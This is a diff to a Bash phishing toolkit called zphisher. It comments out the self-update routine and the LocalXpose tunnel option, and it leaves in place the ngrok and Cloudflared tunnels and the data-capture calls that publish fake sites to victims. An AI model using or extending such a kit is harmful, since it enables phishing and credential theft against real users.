@@ -163,36 +163,36 @@ kill_pid() {
 }
 
 # Check for a newer release
-check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
-
-	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}update found\n"${WHITE}
-		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
-		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
-
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
-			popd > /dev/null 2>&1
-			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
-			{ reset_color ; exit 1; }
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
-			{ reset_color; exit 1; }
-		fi
-	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
-	fi
-}
+# check_update(){
+#	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+#	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+#	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+#	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+#
+#	if [[ $new_version != $__version__ ]]; then
+#		echo -ne "${ORANGE}update found\n"${WHITE}
+#		sleep 2
+#		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+#		pushd "$HOME" > /dev/null 2>&1
+#		curl --silent --insecure --fail --retry-connrefused \
+#		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+#
+#		if [[ -e ".zphisher.tar.gz" ]]; then
+#			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+#			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+#			rm -f .zphisher.tar.gz
+#			popd > /dev/null 2>&1
+#			{ sleep 3; clear; banner_small; }
+#			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+#			{ reset_color ; exit 1; }
+#		else
+#			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+#			{ reset_color; exit 1; }
+#		fi
+#	else
+#		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+#	fi
+#}
 
 ## Check Internet Status
 check_status() {
@@ -382,23 +382,23 @@ install_cloudflared() {
 }
 
 ## Install LocalXpose
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
-	fi
-}
+#install_localxpose() {
+#	if [[ -e ".server/loclx" ]]; then
+#
+#	else
+#		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+#		arch=`uname -m`
+#		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+#			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+#		elif [[ "$arch" == *'aarch64'* ]]; then
+#			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+#		elif [[ "$arch" == *'x86_64'* ]]; then
+#			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+#		else
+#			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+#		fi
+#	fi
+#}
 
 ## Exit message
 msg_exit() {
@@ -561,44 +561,44 @@ start_cloudflared() {
 	capture_data
 }
 
-localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
-		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$loclx_token" > $auth_f 2> /dev/null
-		}
-	}
-}
+#localxpose_auth() {
+#	./.server/loclx -help > /dev/null 2>&1 &
+#	sleep 1
+#	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+#
+#	[ "$(./.server/loclx account status | grep Error)" ] && {
+#		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+#		sleep 3
+#		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+#		[[ $loclx_token == "" ]] && {
+#			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+#		} || {
+#			echo -n "$loclx_token" > $auth_f 2> /dev/null
+#		}
+#	}
+#}
 
 ## Start LocalXpose (Again...)
-start_loclx() {
-	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; localxpose_auth; }
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+#start_loclx() {
+#	cusport
+#	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+#	{ sleep 1; setup_site; localxpose_auth; }
+#	echo -e "\n"
+#	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+#	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+#	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+#
+#	if [[ `command -v termux-chroot` ]]; then
+#		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+#	else
+#		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+#	fi
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	fi
-
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	custom_url "$loclx_url"
-	capture_data
-}
+#	sleep 12
+#	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+#	custom_url "$loclx_url"
+#	capture_data
+#}
 
 ## Start localhost
 start_localhost() {
@@ -618,7 +618,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Account Needed${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		
 
 	EOF
 
@@ -631,8 +631,8 @@ tunnel_menu() {
 			start_ngrok;;
 		3 | 03)
 			start_cloudflared;;
-		4 | 04)
-			start_loclx;;
+	#	4 | 04)
+	#		start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -1007,5 +1007,5 @@ dependencies
 check_status
 install_ngrok
 install_cloudflared
-install_localxpose
+#install_localxpose
 main_menu
